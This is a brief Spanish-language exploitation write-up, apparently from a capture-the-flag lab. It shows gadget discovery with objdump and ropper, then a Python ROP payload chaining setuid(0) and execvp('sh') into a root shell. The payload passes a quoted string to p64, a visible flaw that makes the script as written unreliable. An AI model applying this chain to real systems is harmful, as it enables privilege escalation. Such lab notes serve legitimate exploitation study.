

## Programa con funciones interesantes ya incluidas

Fuente: [Savitar-RedCross](https://www.youtube.com/watch?v=prg88ajxAPc)

Tenemos un binario que tiene las funciones "execvp" y "setuid", queremos usarlas pero pasandoles los argumentos que nos de la gana. El PIE desabilitado (direcciones
estáticas)   
Para ello hay que tirar de ROP y pasarle argumentos con las calling conventions(rdi, rsi, rdx, rcx, r8, r9)
```console
[cucuxii@parrot]~$: objdump -D ./binario | grep execv
0000000000400760 <execvp@plt>:               # -> 0x400760
[cucuxii@parrot]~$: objdump -D ./binario | grep setuid
0000000000400780 <setuid@plt>:               # -> 0x400780
[cucuxii@parrot]~$: ropper --search "pop rdi" -f ./binario 
0x0000000000400de3: pop rdi; ret;            # -> 0x400de3
[cucuxii@parrot]~$: ropper --search  "pop rsi" -f ./binario
0x0000000000400de1: pop rsi; pop r15; ret;   # -> 0x400de1
```
```console
gef > grep "sh"
0x40046e   "sh"
```
Execvp es una funcion que pide dos argumentos -> *execvp("sh", 0);* para ello hay que hacer un pop_rdi (primer argumento) y un pop_rsi (segundo argumento)  
Payload -> pop_rdi + sh + pop_rsi + null + execvp
Pero el gadget que nos ha encontrado "0x400de1" aparte de rsi carga un r15 extra, asi que hay que meter otro argumento más nulo para el r15

Tambien está setuid que hay que ejecutarla antes, como requiere de un solo argumento seria pop_rdi + 0 + setuid
```python3
junk = b"A"*18
execvp = p64(0x400760)
setuid = p64(0x400780)
pop_rdi = p64(0x400de3)
pop_rsi = p64(0x400de1)
sh = p64("0x40046e")
null = p64(0x00)

offset = junk
exec_setuid = pop_rdi + null + setuid
exec_execvp = pop_rdi + sh + pop_rsi + null + null + execvp
payload = offset + exec_setuid + exec_execvp

print(payload)
```
```console
[cucuxii@parrot]~$: (python /tmp/exploit.py; cat) | ./binario
whoami
root
```

--------------------------------------------------------------------------------
